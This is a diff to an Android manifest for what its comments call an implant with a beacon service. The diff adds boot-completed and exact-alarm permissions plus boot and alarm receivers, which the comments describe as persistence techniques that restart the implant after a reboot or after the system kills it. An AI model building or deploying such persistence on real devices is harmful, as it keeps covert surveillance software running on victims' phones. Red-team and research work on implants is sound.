@@ -7,9 +7,12 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <!-- No RECEIVE_BOOT_COMPLETED: this build does not register a boot receiver.
-         Add the permission together with the receiver if you want auto-start,
-         rather than leaving a permission that is never used. -->
+    <!-- The boot receiver is the first persistence technique of the phone:
+         it starts the service again when the machine finishes booting. -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <!-- The alarm that wakes the service when the system killed it needs the
+         permission to schedule an exact alarm. -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
 
     <!-- usesCleartextTraffic: the HTTP transport is plain HTTP by design (the
          implant has no TLS stack); see docs/SECURITY.md limitation 1 and run it
@@ -35,5 +38,24 @@
             android:name=".BeaconService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
+
+        <!-- The boot receiver: the implant comes back after a reboot.  It is
+             exported because the system delivers the broadcast. -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- The alarm receiver: it wakes the service when the system killed
+             it.  It is not exported: only the alarm manager talks to it. -->
+        <receiver
+            android:name=".AlarmReceiver"
+            android:enabled="true"
+            android:exported="false" />
     </application>
 </manifest>
